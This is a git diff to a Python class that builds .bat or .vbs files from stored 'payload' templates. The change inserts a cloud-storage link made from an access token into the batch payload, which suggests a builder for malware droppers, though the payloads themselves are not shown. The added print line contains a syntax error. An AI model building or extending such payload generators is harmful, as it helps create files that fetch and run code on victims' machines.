@@ -1,16 +1,15 @@
 
 import os
-from libs.colors import Colors
+from colors import Colors
+from drive import Drive
 
 class Build :
 
-	global color
-
-	color = Colors()
-
-	def __init__(self, extension, filetype) :
+	def __init__(self, extension, filetype, token) :
 		self.extension = extension
 		self.filetype = filetype
+		self.token = token
+		self.color = Colors()
 
 	def builder(self) :
 		
@@ -23,7 +22,7 @@ class Build :
 			elif self.filetype == "vbs" :
 				payloads = "data/payloads/VBScript/vbs.txt" # Payload file
 
-			print(color.status("[+] Execuable file in directory output/extension/{}".format(self.extension)))
+			
 		
 			build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
 
@@ -33,8 +32,8 @@ class Build :
 				payload = f.read()
 
 				if self.filetype == "bat":
-					payload = payload.replace('***', 'a')
-					pass
+					payload = payload.replace('***', Drive(self.extension, self.token).link())
+					print("{} Execuable file in directory output/extension/{}".format(self.color.status("[+]")self.extension)))
 
 				with open(os.path.join(path, build), 'w') as builder :
 					# Write the new file
